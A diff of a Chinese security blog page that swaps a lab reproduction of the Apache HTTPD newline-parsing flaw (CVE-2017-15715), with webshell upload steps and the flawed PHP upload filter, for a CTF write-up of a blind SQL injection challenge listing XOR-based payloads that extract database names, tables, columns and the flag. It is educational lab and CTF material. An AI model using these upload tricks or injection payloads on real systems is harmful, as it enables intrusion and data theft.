@@ -17,35 +17,33 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="个人的漏洞复现练习，请多批评！">
+<meta name="description" content="题目地址：FinalSQL">
 <meta property="og:type" content="article">
-<meta property="og:title" content="复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）">
-<meta property="og:url" content="https://hdfzzf.github.io/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/index.html">
+<meta property="og:title" content="极客大挑战 2019 FinalSQL">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/index.html">
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
-<meta property="og:description" content="个人的漏洞复现练习，请多批评！">
+<meta property="og:description" content="题目地址：FinalSQL">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png">
-<meta property="article:published_time" content="2022-03-20T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-24T15:05:23.002Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png">
+<meta property="article:published_time" content="2022-04-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-17T10:38:26.559Z">
 <meta property="article:author" content="hdfzzf">
-<meta property="article:tag" content="Apache">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png">
 
 
-<link rel="canonical" href="https://hdfzzf.github.io/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/">
+<link rel="canonical" href="https://hdfzzf.github.io/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/","path":"2022/03/21/复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）/","title":"复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/","path":"2022/04/17/极客大挑战 2019 FinalSQL/","title":"极客大挑战 2019 FinalSQL"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715） | HDFZZF's BLOG</title>
+<title>极客大挑战 2019 FinalSQL | HDFZZF's BLOG</title>
   
 
 
@@ -152,7 +150,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%84%E6%BA%90"><span class="nav-number">4.</span> <span class="nav-text">资源</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -226,7 +224,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/">
+    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/zzf.jpg">
@@ -239,7 +237,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）
+          极客大挑战 2019 FinalSQL
         </h1>
 
         <div class="post-meta-container">
@@ -249,15 +247,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2022-03-21 00:00" itemprop="dateCreated datePublished" datetime="2022-03-21T00:00:00+08:00">2022-03-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-03-24 23:05" itemprop="dateModified" datetime="2022-03-24T23:05:23+08:00">2022-03-24</time>
+      <time title="创建时间：2022-04-17 00:00 / 修改时间：18:38" itemprop="dateCreated datePublished" datetime="2022-04-17T00:00:00+08:00">2022-04-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -265,7 +257,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
         </span>
     </span>
 
@@ -285,8 +277,8 @@
       </span>
       <span class="post-meta-item-text">Disqus：</span>
     
-    <a title="disqus" href="/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/03/21/复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）/" itemprop="commentCount"></span>
+    <a title="disqus" href="/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/17/极客大挑战 2019 FinalSQL/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -297,7 +289,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>940</span>
+      <span>1.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -315,29 +307,29 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>个人的漏洞复现练习，请多批评！</p>
+        <p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B极客大挑战%202019%5DFinalSQL">FinalSQL</a></p>
 <span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
+<h1 id="题目信息">题目信息</h1>
+<p>进入页面，经过相关的测试，发现了三个可能的注入点：用户名、密码和点击数字小方框之后url出现的id。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png" /></p>
+<p>并且，根据最上面的提示，本题估计是sql盲注。</p>
+<h1 id="解题">解题</h1>
+<p>首先以为注入点在用户名和密码，就对其进行了模糊测试：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png" /></p>
+<p>发现过滤了许多东西，而且无法绕过。后来找到了当输入<code>\</code>时，系统报错了，我欣喜若狂，以为这里就是注入点，并且之前还记录了[[过滤单引号的注入方法]]。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png" /></p>
+<p>经过测试，这里确实存在着注入点，但是许多要使用的关键词都被过滤了，比如<code>or</code>、<code>and</code>等，导致无法绕过。</p>
+<p>之后我又去尝试了一下第三个可能的注入点，当我输入如下值时： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1=1 # NO! Not this! Click others</span><br><span class="line">?id=1=2 # ERROR!!!</span><br></pre></td></tr></table></figure></p>
+<p>觉得这里存在着注入点，又经过了不断尝试，确定了注入点就在<code>id</code>，并且参数值正确的时候返回的就是该页面本来的内容，当参数值不正确的时候返回的就是<code>ERROR!!!</code>。</p>
+<p>随后我进行了模糊测试</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png" /></p>
+<p>（其中长度890的都是被过滤了）</p>
+<p>由于这里没有回显，因此尝试盲注（脚本建议自己写，这题的flag字段内容非常多，就离谱）。payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数据库长度: </span><br><span class="line">	异或: ?id=0^(length(database())=4) </span><br><span class="line">	or: ?id=(0)or(length(database())=4) # 下面的也可以用or</span><br><span class="line"></span><br><span class="line">数据库名: ?id=0^(ascii(substr(database(),%d,1))=%d) -&gt; geek</span><br><span class="line"></span><br><span class="line">表名：?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d) -&gt; F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line">字段名: ?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;,%d,1))=%d) -&gt; id,username,password</span><br><span class="line"></span><br><span class="line">字段信息: ?id=0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),%d,1))=%d)</span><br><span class="line">(最后非常的阴间！！！flag在最后面，所以我倒着求，如果正着，总共有200+个字符！！！)</span><br></pre></td></tr></table></figure></p>
+<hr />
+<p>这里解释一下异或： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0^0 -&gt; 0</span><br><span class="line">0^1 -&gt; 1</span><br><span class="line">1^0 -&gt; 1</span><br><span class="line">1^1 -&gt; 0</span><br></pre></td></tr></table></figure></p>
+<p>以数据库长度的payload为例： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果这个为真(length(database())=4)，即值为1，那么?id=0^1=1，从而显示正确的页面内容。</span><br><span class="line">如果这个为假(length(database())=3)，即值为0，那么?id=0^0=0，从而显示错误的页面内容。</span><br></pre></td></tr></table></figure></p>
+<p>因此，当<code>or</code>和<code>and</code>都被过滤的时候，可以考虑一下异或。</p>
+<hr />
 
     </div>
 
@@ -347,21 +339,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Apache/" rel="tag"># Apache</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/" rel="prev" title="网鼎杯 2018 Fakebook">
-                  <i class="fa fa-chevron-left"></i> 网鼎杯 2018 Fakebook
+                <a href="/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/" rel="prev" title="12 Vulnhub HarryPotterFawkes Writeup">
+                  <i class="fa fa-chevron-left"></i> 12 Vulnhub HarryPotterFawkes Writeup
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/03/21/GXYCTF2019%20BabyUpload/" rel="next" title="GXYCTF2019 BabyUpload">
-                  GXYCTF2019 BabyUpload <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
